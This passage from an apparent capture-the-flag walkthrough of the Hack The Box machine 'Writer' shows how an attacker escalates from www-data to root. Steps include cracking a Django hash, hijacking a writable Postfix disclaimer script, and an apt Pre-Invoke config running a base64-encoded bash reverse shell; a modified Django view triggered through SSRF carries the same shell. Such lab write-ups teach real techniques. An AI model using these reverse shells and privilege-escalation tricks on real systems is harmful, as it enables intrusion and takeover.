html  writer.htb  writer2_project

```

`html` is the default folder, and it’s empty. `writer.htb` has the source code I leaked already to get a shell. `writer2_project` is the “new site” that’s seemed to be not even running according to the Apache configs. However, there is a Python process listening on TCP 8080:

```

www-data@writer:/var/www$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      43065/python3
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::445                  :::*                    LISTEN      -
tcp6       0      0 :::139                  :::*                    LISTEN      -

```

There’s also something listening on TCP 25, which I’ll use later.

In the folder, there’s a `manage.py`:

```

www-data@writer:/var/www/writer2_project$ ls
manage.py  requirements.txt  static  staticfiles  writer_web  writerv2

```

That’s a good indication this is a Django web framework application. Looking at it confirms that:

```

#!/usr/bin/env python
import os
import sys

if __name__ == "__main__":
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "writerv2.settings")
    try:
        from django.core.management import execute_from_command_line
    except ImportError:
        # The above import may fail for some other reason. Ensure that the
        # issue is really that Django is missing to avoid masking other
        # exceptions on Python 2.
        try:
            import django
        except ImportError:
            raise ImportError(
                "Couldn't import Django. Are you sure it's installed and "
                "available on your PYTHONPATH environment variable? Did you "
                "forget to activate a virtual environment?"
            )
        raise
    execute_from_command_line(sys.argv)

```

I can use `manage.py` to interact with the application. For example, I can use it to connect to the DB:

```

www-data@writer:/var/www/writer2_project$ python3 manage.py dbshell
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 580
Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [dev]>

```

#### Database

The DB that `manage.py` drops into is `dev`, which is the only interesting DB:

```

MariaDB [dev]> show databases;
+--------------------+
| Database           |
+--------------------+
| dev                |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

```

There’s a handful of tables:

```

MariaDB [dev]> show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.000 sec)

```

`auth_user` is where the hashes are stored:

```

MariaDB [dev]> select * from auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+

```

### Cracking

I’ll feed that hash into `hashcat`, and after a few minutes with `rockyou.txt`, it finds the password:

```

$ hashcat -m 10000 django.hash --force /usr/share/wordlists/rockyou.txt 
...[snip]...
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
...[snip]...

```

### su / SSH

That password works for kyle, either with `su`:

```

www-data@writer:/var/www/writer2_project$ su kyle
Password: 
kyle@writer:/var/www/writer2_project$

```

Or over SSH:

```

oxdf@parrot$ sshpass -p 'marcoantonio' ssh kyle@10.10.11.101
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
...[snip]...
kyle@writer:~$ 

```

And now I have access to `user.txt`:

```

kyle@writer:~$ cat user.txt
9f0e5237************************

```

## Shell as john

### Enumeration

#### groups

It’s worth looking for what other files kyle can access that www-data couldn’t. A good starting place is looking at kyle’s groups:

```

kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)

```

There’s two interesting groups besides the user’s default.

The `kyle` group, after removing stuff from `/run`, `/sys`, and `/proc`, is just the home directory:

```

kyle@writer:~$ find / -group kyle 2>/dev/null | grep -v -e '^/run' -e '^/sys' -e '^/proc'
/home/kyle
/home/kyle/user.txt
/home/kyle/.bash_logout
/home/kyle/.cache
/home/kyle/.cache/motd.legal-displayed
/home/kyle/.bashrc
/home/kyle/.profile

```

`filter` has two files:

```

kyle@writer:~$ find / -group filter 2>/dev/null
/etc/postfix/disclaimer
/var/spool/filter

```

`smbgroup` returns almost 4000 files, but they are all in the `/var/www/writer2_project` directory:

```

kyle@writer:~$ find / -group smbgroup 2>/dev/null | wc -l
3915
kyle@writer:~$ find / -group smbgroup 2>/dev/null | grep -v '^/var/www/writer2' | wc -l
0

```

#### postfix

The `/var/spool/filter` directory is empty, so I’ll look at `/etc/postfix`. [Postfix](http://www.postfix.org/) is a mail server. The HackTricks page on SMTP pentesting has a [section on Postfix](https://book.hacktricks.xyz/pentesting/pentesting-smtp#postfix). `/etc/postfix/master.cf` contains the scripts that are executed on a emails as they arrive. The contents have this format:

```

# ==========================================================================
# service type  private unpriv  chroot  wakeup  maxproc command + args
#               (yes)   (yes)   (no)    (never) (100)
# ==========================================================================

```

The last line of this file is:

```

dfilt     unix  -       n       n       -       -       pipe
  flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}

```

It seems to be running the `/etc/postfix/disclaimer` script as john for arriving emails. I can write to this script:

```

kyle@writer:/etc/postfix$ ls -l disclaimer
-rwxrwxr-x 1 root filter 1021 Dec  2 14:10 disclaimer

```

The contents of `disclaimer` aren’t really important for solving the box. It looks like they are looking for emails from the users in `/etc/postfix/disclaimer_addresses`, and if so, adding a header saying that there is copyrighted material.

### Exploitation

#### Strategy

If each email is run against this script, then I can edit it to get execution as john. I did note above that the `netstat` showed something listening on TCP 25, but only on localhost. I’ll reconnect the SSH session as kyle with `-L 25:127.0.0.1:25` to create a tunnel from TCP 25 on my host into TCP 25 on Writer.

Next I can send an email to that tunnel, and it will trigger the script. In order for the email to reach the script, it must be a valid user. If I try sending to 0xdf@writer.htb (which doesn’t exist), `swaks` returns an error, and this is before running `disclaimer`:

```

oxdf@parrot$ swaks --to 0xdf@writer.htb --from 0xdf@writer.htb --header "Subject: Test!" --body "ignore this" --server 127.0.0.1
=== Trying 127.0.0.1:25...
=== Connected to 127.0.0.1.
<-  220 writer.htb ESMTP Postfix (Ubuntu)
 -> EHLO hacky
<-  250-writer.htb
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<0xdf@writer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<0xdf@writer.htb>
<** 550 5.1.1 <0xdf@writer.htb>: Recipient address rejected: User unknown in local recipient table
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

```

Four lines from the bottom: “Recipient address rejected: User unknown in local recipient table”.

I can use any user on the box. I’ll pick one that is unlikely to be checking email, like irc.

```

oxdf@parrot$ swaks --to irc@writer.htb --from 0xdf@writer.htb --header "Subject: Test!" --body "ignore this" --server 127.0.0.1
=== Trying 127.0.0.1:25...
=== Connected to 127.0.0.1.
<-  220 writer.htb ESMTP Postfix (Ubuntu)
 -> EHLO hacky
<-  250-writer.htb
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<0xdf@writer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<irc@writer.htb>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 02 Dec 2021 09:18:25 -0500
 -> To: irc@writer.htb
 -> From: 0xdf@writer.htb
 -> Subject: Test!
 -> Message-Id: <20211202091825.195665@hacky>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> ignore this
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 98F867ED
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

```

#### POC

I’m a bit skeptical about getting a reverse shell working from within Postfix, so I’ll start really small, by adding `touch /dev/shm/0xdf` to the top of the `disclaimer` script. It’s also important to note that every minute `disclaimer` is set back to it’s original state, so it’s important to write and then send the email immediately.

Now I’ll send an email by running the same command shown above, and the file exists:

```

kyle@writer:/etc/postfix$ ls -l /dev/shm/0xdf 
-rw------- 1 john john 0 Dec  2 14:23 /dev/shm/0xdf

```

It’s owned and only readable by john, so I can’t write things into the file. But this does confirm the process is run as john.

#### SSH Key

I’ll add a line at the top of the file to add my SSH key into john’s `authorized_keys` file:

[![image-20211202092057266](https://0xdfimages.gitlab.io/img/image-20211202092057266.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211202092057266.png)

I’ll send the email just like before, and now I can SSH as john using my key:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen john@10.10.11.101
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
...[snip]...
john@writer:~$

```

## Shell as root

### Enumeration

#### apt Configs

john has a new group, `management`:

```

john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)

```

This group owns a single folder:

```

john@writer:~$ find / -group management -ls 2>/dev/null
    17525      4 drwxrwxr-x   2 root     management     4096 Jul 28 09:24 /etc/apt/apt.conf.d

```

This directory holds the configuration files applied in alphabetical order. From the [debian apt-get man page](https://debian-handbook.info/browse/wheezy/sect.apt-get.html):

> Directories with a `.d` suffix are used more and more often. Each directory represents a configuration file which is split over multiple files. In this sense, all of the files in `/etc/apt/apt.conf.d/` are instructions for the configuration of APT. APT includes them in alphabetical order, so that the last ones can modify a configuration element defined in one of the first ones.

There’s a bunch of config files already in there:

```

john@writer:/etc/apt/apt.conf.d$ ls
01autoremove  01-vendor-ubuntu  10periodic  15update-stamp  20archive  20packagekit  20snapd.conf  50command-not-found  70debconf  99update-notifier

```

I can read but not write to these. But I can create new ones:

```

john@writer:/etc/apt/apt.conf.d$ touch 00-test
john@writer:/etc/apt/apt.conf.d$ ls
00-test  01autoremove  01-vendor-ubuntu  10periodic  15update-stamp  20archive  20packagekit  20snapd.conf  50command-not-found  70debconf  99update-notifier

```

#### Processes

Just being able to write to the `apt` config doesn’t buy me much unless it’s being run. I don’t see it in the process list, but I’ll upload [pspy](https://github.com/DominicBreuker/pspy) to look for a potential cron. There’s a lot of crons running

After about a minute, it’s there:

```

2021/12/02 17:28:02 CMD: UID=0    PID=59847  | /bin/sh -c /usr/bin/apt-get update

```

It seems to be running every two minutes.

The other crons:
- Remove any files in `/etc/apt/apt.conf.d` that are older than one minute every two minutes.
- Reset the `disclaimer` script back to what it was every two minutes.
- Reset the `master.cf` file every two minutes.
- Reset the v2 writer project folder from a copy in root every two minutes, and re-run the server.
- Clear `/tmp` every minute.

### Shell

The [GTFObins page](https://gtfobins.github.io/gtfobins/apt-get/) for `apt-get` shows that it can be abused by setting a Pre-Invoke script. For example, with `sudo`:

```

sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

```

The same thing can be added to a config file:

```

apt::Update::Pre-Invoke {"command";};

```

I’ll create a base64 encoded reverse shell:

```

oxdf@parrot$ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' | base64 -w0
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzIDA+JjEiCg==

```

And add that to a config file:

```

john@writer:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzIDA+JjEiCg== | base64 -d | bash"};' > 000-shell

```

I’ll be sure to keep an eye out for the time, as it seems like the cron could remove my config before it gets used if I add it with more than a minute to go until the next run.

The next time it runs, I get a shell:

```

oxdf@parrot$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.101 42508
bash: cannot set terminal process group (3923): Inappropriate ioctl for device
bash: no job control in this shell
root@writer:/tmp# 

```

And I can get the flag:

```

root@writer:~# cat root.txt
740e18db************************

```

## Beyond Root - Intended Foothold

The command injection in the web application was not the intended path to get a foothold. It’s actually more complicated.

### Samba

I can use the SQL file read to get the Samba config file from `/etc/samba/smb.conf`. It’s long, but at the bottom it defines a share named `writer2_project`:

```

[writer2_project]
  path = /var/www/writer2_project
  valid users = @smbgroup
  guest ok = no
  writable = yes
  browsable = yes

```

I noted the DB credentials in the writer web source, “ToughPasswordToCrack”. That password works for kyle over SMB:

```

oxdf@parrot$ smbmap -H 10.10.11.101 -u kyle -p ToughPasswordToCrack
                                                                                                    
[+] IP: 10.10.11.101:445        Name: writer.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        writer2_project                                         READ, WRITE
        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))

```

kyle has read/write access to `writer2_project`, which is running on localhost:8080.

The files seem to match:

```

oxdf@parrot$ smbclient -U kyle //10.10.11.101/writer2_project ToughPasswordToCrack
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Dec  2 13:48:29 2021
  ..                                  D        0  Tue Jun 22 13:55:06 2021
  static                              D        0  Sun May 16 16:29:16 2021
  staticfiles                         D        0  Fri Jul  9 06:59:42 2021
  writer_web                          D        0  Wed May 19 11:26:18 2021
  requirements.txt                    N       15  Thu Dec  2 13:50:01 2021
  writerv2                            D        0  Wed May 19 08:32:41 2021
  manage.py                           N      806  Thu Dec  2 13:50:01 2021

                7151096 blocks of size 1024. 2479424 blocks available

```

I can explore this code and get a feel for the second site.

### Version Two

In the `writerv2` directory, `urls` defines what urls match to what views:

```

...[snip comments]...
from django.conf.urls import url, include
from django.contrib import admin

urlpatterns = [
    url(r'^admin/', admin.site.urls),
    url(r'^', include('writer_web.urls')),
]

```

These aren’t too helpful, as much of the site isn’t implemented yet. There’s another `urls.py` in `writer_web`:

```

from django.conf.urls import url
from writer_web import views

urlpatterns = [
    url(r'^$', views.home_page, name='home'),
]

```

It matches on an empty path (basically `/`), and returns `views.home_page`. `views.py` has that function:

```

from django.shortcuts import render
from django.views.generic import TemplateView

def home_page(request):
    template_name = "index.html"
    return render(request,template_name)

```

### Exploit

#### Strategy

If I modify this code and put it back, then somehow manage to load the page, I’ll get execution. There are two steps here. First I need to create a payload that works, and then I need to make sure I have an SSRF that can trigger it.

#### SSRF

The SSRF in the main Writer site comes from giving it a image url:

![image-20211202140640007](https://0xdfimages.gitlab.io/img/image-20211202140640007.png)

There’s a lot of annoying client-side filtering, so I’ll put in 0xdf.com and submit it, and then get that request and send it over to Repeater.

I remember from the original source that it only goes the path of the SSRF if `.jpg` is in the url. But I also need the url to hit the `/` of v2. I can achieve this using `.jpg` as a parameter, `http://127.0.0.1:8080/?.jpg`. An anchor point (`/#.jpg`) would work as well.

#### Payload

My new `views.py` uses the same reverse shell I used above for root:

```

from django.shortcuts import render
from django.views.generic import TemplateView
import os

def home_page(request):
    os.system('echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzIDA+JjEiCg== | base64 -d | bash')
    template_name = "index.html"
    return render(request,template_name)

```

#### Trigger

I’ll upload this modified `views.py` using `smbclient`:

```

smb: \writer_web\> put views.py 
putting file views.py as \writer_web\views.py (4.1 kb/s) (average 4.0 kb/s)

```

And then immediately after in Burp trigger the SSRF:

[![image-20211202140902669](https://0xdfimages.gitlab.io/img/image-20211202140902669.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211202140902669.png)

At `nc`, I get a shell as www-data:

```

oxdf@parrot$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.101 43108
bash: cannot set terminal process group (949): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:~/writer2_project$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```